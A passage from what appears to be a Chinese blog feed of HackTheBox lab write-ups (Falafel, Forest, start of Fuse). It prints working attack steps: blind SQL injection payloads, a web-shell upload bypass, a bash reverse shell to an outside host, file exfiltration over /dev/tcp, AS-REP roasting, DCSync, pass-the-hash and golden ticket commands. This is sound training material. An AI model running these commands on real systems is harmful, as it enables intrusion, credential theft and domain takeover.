<p>第一个字段名长度为2<br>第二个字段名长度为8<br>第三个字段名长度为4<br>第四个字段名长度为8</p>
<h4 id="确认字段名称"><a href="#确认字段名称" class="headerlink" title="确认字段名称"></a>确认字段名称</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&#x3D;1      &#x2F;&#x2F;确认第一个字段名称第一个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),2,1)))&#x3D;1		 &#x2F;&#x2F;确认第一个字段名称第二个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;1		 &#x2F;&#x2F;确认第二个字段名称第一个字母</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/8.jpg" alt="8"></p>
<p>比如这里得到第一个字段名称的第一个字母的ascii码为73，字母为D</p>
<p>以此类推，字段名如下<br>ID<br>password<br>role<br>username</p>
<h4 id="确认记录数量"><a href="#确认记录数量" class="headerlink" title="确认记录数量"></a>确认记录数量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(*) from falafel.users)&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/9.jpg" alt="9"></p>
<p>表内有两条记录</p>
<h4 id="确认记录长度"><a href="#确认记录长度" class="headerlink" title="确认记录长度"></a>确认记录长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(role) from users limit 0,1)&#x3D;1#       &#x2F;&#x2F;确认字段role的第一条记录的长度</span><br><span class="line">admin&#39; and (select length(role) from users limit 1,1)&#x3D;1#       &#x2F;&#x2F;确认字段role的第二条记录的长度</span><br><span class="line">admin&#39; and (select length(password) from users limit 0,1)&#x3D;1#   &#x2F;&#x2F;确认字段password的第一条记录的长度</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/10.jpg" alt="10"></p>
<h4 id="确认记录内容"><a href="#确认记录内容" class="headerlink" title="确认记录内容"></a>确认记录内容</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第一条记录的第一个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select password from users limit 0,1),2,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第一条记录的第二个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select password from users limit 1,1),1,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第二条记录的第一个字母</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/11.jpg" alt="11"></p>
<p>比如这表示字段password的第一条记录第一位ascii码为48，字母是0</p>
<p>一次类推</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>最后可以完美得到这张表的所有字段的所有记录</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>role</th>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>admin</td>
<td>0e462096931906507119562988736854</td>
</tr>
<tr>
<td>2</td>
<td>normal</td>
<td>chris</td>
<td>d4ee02a22fc872e36d9e3751ba72ddc8</td>
</tr>
</tbody></table>
<h3 id="php-magichash漏洞"><a href="#php-magichash漏洞" class="headerlink" title="php magichash漏洞"></a>php magichash漏洞</h3><p>对上述密码进行破解</p>
<p>破解出<code>chris/juggling</code>，但admin没破解出密码<br>我们可以用chris登录进去，但啥也没有</p>
<p><img src="/images/Falafel/12.jpg" alt="12"></p>
<p>admin的hash很有意思，它以<code>0e</code>开头，如果php未进行强类型比较，会造成hash被当成科学计数法来比较的情况</p>
<p>我们随便找一个字符串，比如<code>QNKCDZO</code>它的md5值也为<code>0e</code>开头<br><code>admin/QNKCDZO</code>进行登录</p>
<p><img src="/images/Falafel/13.jpg" alt="13"></p>
<p>成功登录</p>
<h3 id="长文件名截断上传getshell"><a href="#长文件名截断上传getshell" class="headerlink" title="长文件名截断上传getshell"></a>长文件名截断上传getshell</h3><p>正常上传一个处理过mime的图片过去</p>
<p><img src="/images/Falafel/14.jpg" alt="14"></p>
<p>访问发现无法运行</p>
<p><img src="/images/Falafel/15.jpg" alt="15"></p>
<p>在另一个页面得到了提示，提示了文件名的长度，想到了文件长度截断</p>
<p>我生成的文件名: <code>255-8个a</code>+<code>.php.jpg</code>（我的linux最长文件名长度为255)</p>
<p><img src="/images/Falafel/16.jpg" alt="16"></p>
<p>得到了有用的信息，首先发出警告文件名过长，但上传还是成功了，而且给出了保存的文件名，通过保存的文件名，我们就可以知道对方文件名的长度限制，计算出我们文件名，使其上传之后能够截断<code>.php.jpg</code>的<code>.jpg</code>，从而执行php代码</p>
<p><img src="/images/Falafel/17.jpg" alt="17"></p>
<p>发现对方文件名总长为237</p>
<p>所以我们的文件名应该为:<code>237-4个a</code>+<code>.php.jpg</code>，这样总长为241，截断末尾4字节(.jpg)</p>
<p><img src="/images/Falafel/18.jpg" alt="18"></p>
<p>看样子保存的格式的确为php了</p>
<p><img src="/images/Falafel/19.jpg" alt="19"></p>
<p>一句话木马执行成功</p>
<p>反弹shell payload进行url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;4444 0&gt;&amp;1&#39;</span><br><span class="line">%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%31%30%30%2f%34%34%34%34%20%30%3e%26%31%27</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/20.jpg" alt="20"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现mysql连接文件</p>
<p><img src="/images/Falafel/21.jpg" alt="21"></p>
<p>成功复用密码切换账号</p>
<p><img src="/images/Falafel/22.jpg" alt="22"></p>
<h3 id="video"><a href="#video" class="headerlink" title="video"></a>video</h3><p>还发现用户moshe在video组<br>有关video提权，可以在这里看到:<a href="https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html">链接</a></p>
<p><img src="/images/Falafel/24.jpg" alt="24"></p>
<p>大概提权思路是，输出图像会存储在帧缓冲区，fb0表示第一帧，fb1表示第二帧，以此类推，我们可以用一个perl脚本，将其还原成图片</p>
<p>先把这个文件给传过来，改名为fb.raw</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999 &gt; fb.raw</span><br><span class="line">cat &#x2F;dev&#x2F;fb0 &gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;9999</span><br></pre></td></tr></table></figure>

<p>接着去读取屏幕的长和宽</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;sys&#x2F;class&#x2F;graphics&#x2F;fb0&#x2F;virtual_size </span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/25.jpg" alt="25"></p>
<p>源码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;perl -w</span><br><span class="line"></span><br><span class="line">$w &#x3D; shift || 240;</span><br><span class="line">$h &#x3D; shift || 320;</span><br><span class="line">$pixels &#x3D; $w * $h;</span><br><span class="line"></span><br><span class="line">open OUT, &quot;|pnmtopng&quot; or die &quot;Can&#39;t pipe pnmtopng: $!\n&quot;;</span><br><span class="line"></span><br><span class="line">printf OUT &quot;P6%d %d\n255\n&quot;, $w, $h;</span><br><span class="line"></span><br><span class="line">while ((read STDIN, $raw, 2) and $pixels--) &#123;</span><br><span class="line">   $short &#x3D; unpack(&#39;S&#39;, $raw);</span><br><span class="line">   print OUT pack(&quot;C3&quot;,</span><br><span class="line">      ($short &amp; 0xf800) &gt;&gt; 8,</span><br><span class="line">      ($short &amp; 0x7e0) &gt;&gt; 3,</span><br><span class="line">      ($short &amp; 0x1f) &lt;&lt; 3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close OUT;</span><br></pre></td></tr></table></figure>

<p>转换图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install pnmtopng</span><br><span class="line">perl rock.pl 1176 885 &lt; fb.raw &gt; fb0.png</span><br></pre></td></tr></table></figure>

<p>或者可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gnup</span><br></pre></td></tr></table></figure>

<p>打开选项，选择</p>
<p><img src="/images/Falafel/26.jpg" alt="26"></p>
<p>之后就可以读到密码</p>
<p><img src="/images/Falafel/27.jpg" alt="27"></p>
<p><code>MoshePlzStopHackingMe!</code></p>
<p>成功切换到用户<code>yossi</code></p>
<p><img src="/images/Falafel/28.jpg" alt="28"></p>
<p>我们发现<code>yossi</code>在用户组<code>disk</code>中</p>
<p>disk组的权限约等于root，因为它拥有对dev整个读和写的权限</p>
<p><img src="/images/Falafel/30.jpg" alt="30"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debugfs &#x2F;dev&#x2F;sda1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/29.jpg" alt="29"></p>
<p>我们甚至能直接读root.txt<br>我们可以读取root的私钥(<code>/root/.ssh/id_rsa</code>)</p>
<p><img src="/images/Falafel/31.jpg" alt="31"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Forest</title>
    <url>/2021/05/29/HTB-Forest/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Forest/1.png" alt="1"></p>
<p>据说这台机器很难，所以我决定逐个端口枚举，正好它也没有HTTP服务</p>
<p>尝试DNS区域传输，没有收获</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig  @10.10.10.161 htb.local axfr</span><br><span class="line">dig  @10.10.10.161 forest.htb.local axfr</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/2.png" alt="2"></p>
<p>SMB枚举，没有权限</p>
<p><img src="/images/Forest/3.png" alt="3"></p>
<p>LDAP枚举和以前没什么区别，这里允许匿名枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search 10.10.10.161</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -s base namingcontexts</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39;</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39;</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;User)&#39;</span><br></pre></td></tr></table></figure>

<p>这里我们可以通过<code>userPrincipalName</code>或<code>sAMAccountName</code>枚举用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39; sAMAccountName</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39; userPrincipalName</span><br></pre></td></tr></table></figure>

<p>这里可以使用<a href="https://github.com/ropnop/windapsearch">windapsearch</a>，它的原理相同，输出更美观一些，功能也多一些</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 -U</span><br><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 -G</span><br></pre></td></tr></table></figure>

<p>枚举用户其实使用的是<code>objectCategory=user</code>这个过滤器，我们可以手动选择过滤器，来枚举其他对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 --custom &quot;objectClass&#x3D;*&quot;</span><br></pre></td></tr></table></figure>

<p>发现了服务账号<code>svc-alfresco</code>，</p>
<p><img src="/images/Forest/4.png" alt="4"></p>
<p>这是一个很重要的提醒，通过<a href="https://docs.alfresco.com/process-services/latest/config/authenticate/">文章</a>可以发现，该服务账户的使用需要打开<code>DONT_REQ_PREAUTH</code>，这表示我们可以尝试AS-REP roasting</p>
<p><img src="/images/Forest/5.png" alt="5"></p>
<p>再更进一步之前，我决定继续完成枚举工作</p>
<p>使用CME在空会话下，这里成功枚举出密码策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.161 --pass-pol -u &#39;&#39; -p &#39;&#39;</span><br></pre></td></tr></table></figure>

<p>比如<code>Account Lockout Threshold: None</code>就告诉我们，如果想，可以放心的进行多线程暴力破解</p>
<p><img src="/images/Forest/8.png" alt="8"></p>
<p>进行RCP枚举(445)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 10.10.10.161</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">rpcclient $&gt; enumdomgroups</span><br></pre></td></tr></table></figure>

<p>这里无法枚举SID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames administrator</span><br><span class="line">result was NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>但这里可以使用一个Trick来直接枚举组的名称，组内的成员数量，和具体的组内成员是谁，以<code>Domain Admins</code>组为例</p>
<p>通过组织id号<code>0x200</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x200</span><br><span class="line"></span><br><span class="line">Group Name:     Domain Admins</span><br><span class="line">Description:    Designated administrators of the domain</span><br><span class="line">Group Attribute:7</span><br><span class="line">Num Members:1rpcclient $&gt; querygroupmem 0x200</span><br><span class="line">rid:[0x1f4] attr:[0x7]</span><br></pre></td></tr></table></figure>

<p>得到rid值<code>0x1f4</code>，我们可以直接查询它，得到用户<code>Administrator</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x1f4</span><br><span class="line">User Name   :   Administrator</span><br><span class="line">Full Name   :   Administrator</span><br><span class="line">Home Drive  :</span><br><span class="line">Dir Drive   :</span><br><span class="line">Profile Path:</span><br><span class="line">Logon Script:</span><br><span class="line">Description :   Built-in account for administering the computer&#x2F;domain</span><br><span class="line">Workstations:</span><br><span class="line">Comment     :</span><br><span class="line">Remote Dial :</span><br><span class="line">Logon Time</span><br><span class="line">       :      Mon, 07 Oct 2019 06:57:07 EDT</span><br><span class="line">Logoff Time</span><br><span class="line">      :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">Kickoff Time</span><br><span class="line">     :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT</span><br><span class="line">Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT</span><br><span class="line">Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT</span><br><span class="line">unknown_2[0..31]...</span><br><span class="line">user_rid :      0x1f4</span><br><span class="line">group_rid:      0x201</span><br><span class="line">acb_info :      0x00020010</span><br><span class="line">fields_present: 0x00ffffff</span><br><span class="line">logon_divs:     168</span><br><span class="line">bad_password_count:     0x00000000</span><br><span class="line">logon_count:    0x00000031</span><br><span class="line">padding1[0..7]...</span><br><span class="line">logon_hrs[0..21]...</span><br></pre></td></tr></table></figure>

<p>后面的套路类似，顺着枚举组就行了，类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x201rpcclient $&gt; querygroupmem 0x201</span><br><span class="line">        rid:[0x1f4] attr:[0x7]</span><br><span class="line">        rid:[0x1f7] attr:[0x7]</span><br><span class="line">        rid:[0x1f6] attr:[0x7]</span><br><span class="line">        rid:[0x463] attr:[0x7]</span><br><span class="line">        rid:[0x464] attr:[0x7]</span><br><span class="line">        rid:[0x465] attr:[0x7]</span><br><span class="line">        rid:[0x466] attr:[0x7]</span><br><span class="line">        rid:[0x467] attr:[0x7]</span><br><span class="line">        rid:[0x468] attr:[0x7]</span><br><span class="line">        rid:[0x469] attr:[0x7]</span><br><span class="line">        rid:[0x46a] attr:[0x7]</span><br><span class="line">        rid:[0x46b] attr:[0x7]</span><br><span class="line">        rid:[0x46c] attr:[0x7]</span><br><span class="line">        rid:[0x46e] attr:[0x7]</span><br><span class="line">        rid:[0x46f] attr:[0x7]</span><br><span class="line">        rid:[0x470] attr:[0x7]</span><br><span class="line">        rid:[0x471] attr:[0x7]</span><br><span class="line">        rid:[0x472] attr:[0x7]</span><br><span class="line">        rid:[0x473] attr:[0x7]</span><br><span class="line">        rid:[0x474] attr:[0x7]</span><br><span class="line">        rid:[0x475] attr:[0x7]</span><br><span class="line">        rid:[0x476] attr:[0x7]</span><br><span class="line">        rid:[0x477] attr:[0x7]</span><br><span class="line">        rid:[0x478] attr:[0x7]</span><br><span class="line">        rid:[0x479] attr:[0x7]</span><br><span class="line">        rid:[0x47a] attr:[0x7]</span><br><span class="line">        rid:[0x47b] attr:[0x7]</span><br><span class="line">        rid:[0x47e] attr:[0x7]</span><br><span class="line">        rid:[0x47f] attr:[0x7]</span><br><span class="line">        rid:[0x480] attr:[0x7]</span><br></pre></td></tr></table></figure>

<p>之后有了rid，就可以直接查询用户名了</p>
<p>最后88端口kerberos就不暴力枚举用户名了，有了之前的技巧我觉得这个操作显得很多余</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>枚举部分已经精准定位了对账户<code>svc-alfresco</code>的AS-REP roasting攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$GetNPUsers.py htb.local&#x2F;svc-alfresco -no-pass -dc-ip 10.10.10.161 </span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 </span><br><span class="line">SecureAuth Corporation[*] Getting TGT for svc-alfresco</span><br><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:d02cfbcdfc65857f3bc456c7932ad436$8bcc9e514c1984b22e16885874fe98b09e321a871a88d94b4cbb2411aa06a75180e3f2c74fd0a2e8b21855fa340e5eff7312d8806a33370b54cd0af4a8c5be48a64b82b37e41f4cb8ac6645397952ef1ecfed252944e63ac07a633e332de1d42c2d9738f44eadafe5d652d61f38d197f51c85a1cdef7e408d81ed13660c32814d09a29eb4f7cb04ab73b3fc6b420dd4f547bd16663d8f6b79159d617f994c2f15ad06ca454f3e2620c0bf8bc99874ce2337ab84e28e186b611b1d8bd69cb8213a4976c48e7869be05dad7a463c2a9d38ea495690a999ab4353d6151abb043c8850ea3e955048</span><br></pre></td></tr></table></figure>

<p>破解哈希，得到<code>s3rvice</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/6.png" alt="6"></p>
<p>这样我们就可以使用凭据<code>svc-alfresco/s3rvice</code>进行WinRM连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br></pre></td></tr></table></figure>

<p>成功获得shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>首先我是用PowerView解决当前用户的嵌套组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\powerview.ps1</span><br><span class="line">Get-Netgroup -username svc-alfresco |select-object name,memberof</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/9.png" alt="9"></p>
<p>或者直接枚举用户组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainGroup -MemberIdentity svc-alfresco |select-object samaccountname</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/17.png" alt="17"></p>
<p>输出很有意思，说明当前用户关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svc-alfresco属于→Service Accounts属于→Privilege IT Accounts</span><br><span class="line">Privilege IT Accounts同时属于→Account Operators和Remote Management </span><br><span class="line">Users(所以可以WinRM)当然svc-alfresco也属于→Domain Users组</span><br></pre></td></tr></table></figure>

<p>在BloodHound中，我们可以<code>Unrolled Group Membership</code>更清晰的展示</p>
<p><img src="/images/Forest/10.png" alt="10"></p>
<p>知道组织关系是之后提权的关键，继续查看<code>Find Shortest Paths to Domain Admins</code></p>
<p><img src="/images/Forest/11.png" alt="11"></p>
<h2 id="滥用Account-Operators组GenericAll权限"><a href="#滥用Account-Operators组GenericAll权限" class="headerlink" title="滥用Account Operators组GenericAll权限"></a>滥用Account Operators组GenericAll权限</h2><p><code>Account Operators</code>组内的成员拥有创建/添加账户到不受保护组的权限(受保护的比如<code>Domain Admins</code>组、<code>Account Operators</code>组本身等)和本地登陆域控的权限，参考<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn579255(v=ws.11)#account-operators">链接</a></p>
<p>这里我们将创建一个账户，并添加到<code>Exchange Windows permissions</code>组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user arsene password123 &#x2F;domain &#x2F;add</span><br></pre></td></tr></table></figure>

<p>习惯性将用户添加到本地<code>Remote Management Users</code>组，这样就拥有了WinRM连接的权限(虽然这里不需要用到该用户的shell)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup &quot;Remote Management Users&quot; arsene &#x2F;add</span><br></pre></td></tr></table></figure>

<p>为了利用，将用户添加到<code>Exchange Windows permissions</code>组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Exchange Windows permissions&quot; arsene &#x2F;add</span><br></pre></td></tr></table></figure>

<h2 id="滥用Exchange-Windows-permissions组WriteDacl权限"><a href="#滥用Exchange-Windows-permissions组WriteDacl权限" class="headerlink" title="滥用Exchange Windows permissions组WriteDacl权限"></a>滥用Exchange Windows permissions组WriteDacl权限</h2><p>在<code>Exchange Windows permissions</code>组，我们拥有WriteDacl权限，这表示我们可以DCSync参考:<a href="https://adsecurity.org/?p=4119">链接</a></p>
<p>首先添加权限(别忘了域账号前缀)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\powerview.ps1</span><br><span class="line">$SecPassword &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$Cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;HTB\arsene&#39;, $SecPassword)</span><br><span class="line">Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC&#x3D;htb,DC&#x3D;local&quot; -PrincipalIdentity arsene -Rights DCSync</span><br></pre></td></tr></table></figure>

<p>这样我就可以进行DCSync了。通过Mimikatz或Secretsdump.py</p>
<p>secretsdump需要TCP135，445和一个随机的高RPC端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py htb.local&#x2F;arsene:password123@10.10.10.161</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/12.png" alt="12"></p>
<h3 id="方法1-PTH"><a href="#方法1-PTH" class="headerlink" title="方法1 PTH"></a>方法1 PTH</h3><p>Administrator的Hash没破解成功，但可以进行PTH攻击</p>
<p>为了有趣不使用<code>psexec.py</code>，因为它会自动提升到SYSTEM权限，脱离了域账号，所以我使用<code>wmiexec.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local&#x2F;administrator@10.10.10.161</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/12.png" alt="12"></p>
<p>或者WinRM也可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</span><br></pre></td></tr></table></figure>

<h3 id="方法2-Goldenticket-for-Linux"><a href="#方法2-Goldenticket-for-Linux" class="headerlink" title="方法2 Goldenticket for Linux"></a>方法2 Goldenticket for Linux</h3><p>平常<code>GoldenTicket</code>的利用都在目标机器上使用Mimikatz，这次我会在linux利用<code>GoldenTicket</code></p>
<p>首先在机器上没枚举SID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-Addomain htb.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/14.png" alt="14"></p>
<p>得到`S-1-5-21-3072663084-364016917-1341370565</p>
<p>不知道为啥，时间设置后在使用psexec时，还会出现时间戳的错误<code>Clock skew too great</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; get-dateWednesday, May 26, 2021 8:18:18 PM</span><br></pre></td></tr></table></figure>

<p>先不管继续后面的操作</p>
<p>之后生成黄金票据，通过设置环境变量导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local evilarseneexport KRB5CCNAME&#x3D;&#x2F;tmp&#x2F;evilarsene.ccache</span><br></pre></td></tr></table></figure>

<p>添加hosts，进行域名解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.161    htb.local forest</span><br></pre></td></tr></table></figure>

<p>之后-k参数使用黄金票据进行验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -k -no-pass HTB.LOCAL&#x2F;evilarsene@forest</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/15.png" alt="15"></p>
<p>为了上述解决时间问题，决定暴力枚举。首先我们需要在目标机器上获取除了小时后面的时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; get-dateWednesday, May 26, 2021 8:18:18 PM</span><br></pre></td></tr></table></figure>

<p>在本机上通过<code>date -s</code>暴力枚举，时间正常就可以使用黄金票据了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in $(seq 00 24);do date -s $i:19:00;psexec.py -k -no-pass HTB.LOCAL&#x2F;evilarsene@forest; done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Forest/16.png" alt="16"></p>
<p>其实这里最正确的方法是使用NTP协议(UDP端口123)和域控同步时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntpdate 10.10.10.161</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Fuse</title>
    <url>/2020/10/16/HTB-Fuse/</url>
    <content><![CDATA[<h1 id="Fuse"><a href="#Fuse" class="headerlink" title="Fuse"></a>Fuse</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53&#x2F;tcp    open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    bind</span><br><span class="line">80&#x2F;tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">88&#x2F;tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-10-15 17:19:35Z)</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)</span><br><span class="line">464&#x2F;tcp   open  kpasswd5?</span><br><span class="line">593&#x2F;tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp   open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp  open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389&#x2F;tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">49666&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49667&#x2F;tcp open  msrpc        Microsoft 